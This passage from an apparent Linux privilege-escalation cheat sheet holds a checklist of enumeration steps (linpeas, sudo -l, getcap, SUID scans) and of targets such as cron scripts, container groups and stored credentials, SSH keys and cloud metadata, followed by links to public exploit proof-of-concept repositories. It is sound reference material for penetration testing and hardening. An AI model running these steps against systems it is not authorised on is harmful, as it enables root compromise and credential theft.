| Unpatched kernel 5.8-5.16.11 | DirtyPipe range | CVE-2022-0847 |

---

## 13. Quick win checklist

- [ ] Run `linpeas.sh` and read the red lines.
- [ ] `sudo -l` -> GTFOBins every entry. Check sudo version for CVE-2025-32463.
- [ ] `getcap -r /` -> GTFOBins every cap.
- [ ] SUID scan -> compare against known list.
- [ ] Writable cron scripts or wildcard args.
- [ ] Kernel version vs recent CVE table (section 3).
- [ ] Docker/lxd group or privileged container. runc version for CVE-2024-21626.
- [ ] NFS `no_root_squash` share.
- [ ] Stored creds in configs, history, `.env`, git.
- [ ] SSH keys, cloud metadata, IMDSv1.
- [ ] PAM `user_readenv=1` on SUSE for CVE-2025-6018.
- [ ] 2026 page-cache LPEs: check kernel commit age vs Copy Fail (algif_aead
      since 2017), Dirty Frag (esp4/esp6/rxrpc, patched May 2026), RefluXFS
      (XFS reflink), Pedit COW (act_pedit). These are fileless so FIM is blind.
- [ ] 2026 other LPEs: PinTheft (RDS), CIFSwitch (cifs.spnego), GhostLock
      (MediaTek ARM), skbuff UAF (6.12.x), snap-confine (Ubuntu), Pardus
      Software Center.

---

## 14. References and tools

- LinPEAS: <https://github.com/carlospolop/PEASS-ng>
- LinEnum: <https://github.com/rebootuser/LinEnum>
- pspy: <https://github.com/dominicbreuker/pspy>
- linux-exploit-suggester: <https://github.com/mzet-/linux-exploit-suggester>
- GTFOBins: <https://gtfobins.github.io>
- HackTricks Linux: <https://book.hacktricks.xyz/linux-hardening/privilege-escalation>
- PayloadsAllTheThings Linux: <https://github.com/swisskyrepo/PayloadsAllTheThings>
- Snoopy-Sec Localroot archive: <https://github.com/Snoopy-Sec/Localroot-ALL-CVE>
- ThatTotallyRealMyth LinuxPrivEsc: <https://github.com/ThatTotallyRealMyth/LinuxPrivEsc>
- CVE-2024-1086 PoC: <https://github.com/Notselwyn/CVE-2024-1086>
- CVE-2025-32463 PoC: <https://github.com/1xPwn/CVE-2025-32463>
- CVE-2025-6018/6019 PoC: <https://github.com/DesertDemons/CVE-2025-6018-6019>
- CVE-2025-6019 racer: <https://github.com/JM00NJ/CVE-2025-6019-udisks2-XFS-Resize-TOCTOU-Privilege-Escalation>
- CVE-2025-27591 PoC: <https://github.com/MoTechStore/CVE-2025-27591-PoC>
- PwnKit: <https://github.com/ly4k/PwnKit>
- DirtyPipe: <https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit>
- Kernel exploit repo: <https://github.com/xairy/kernel-exploits>
- 2026 Copy Fail tracker: <https://kimmo.cloud/CVE-2026-31431/>
- 2026 Copy Fail PoC: <https://github.com/Dullpurple-sloop726/CVE-2026-31431-Linux-Copy-Fail>
- 2026 Dirty Frag PoC (V4bel): <https://github.com/V4bel/dirtyfrag>
- 2026 Dirty Frag lab repo: <https://github.com/kuniyal08/Dirty-Frag-CVE-2026-43284>
- 2026 RefluXFS PoC: <https://github.com/masrikky/CVE-2026-64600-RefluXFS>
- 2026 RefluXFS writeup: <https://noted.my.id/article/cve-2026-64600-refluxfs>
- 2026 PinTheft tracker: <https://kimmo.cloud/pintheft/>
- 2026 PinTheft repo: <https://github.com/suominen/pintheft>
- 2026 CIFSwitch tracker: <https://kimmo.cloud/cifswitch/>
- 2026 CIFSwitch repo: <https://github.com/suominen/cifswitch>
- 2026 GhostLock PoC: <https://github.com/NothingFumo/ghostlock-aresin>
- 2026 Pedit COW PoC: <https://github.com/cherrycherrymay/PoC-CVE-2026-46331>
- 2026 skbuff UAF PoC: <https://github.com/vn-lazyming/CVE-2026-52943>
- 2026 Pardus Software LPE: <https://github.com/dasokkk/CVE-2026-14459-14460-pardus-software>
- CERT/CC Dirty Frag advisory: <https://kb.cert.org/vuls/id/980487>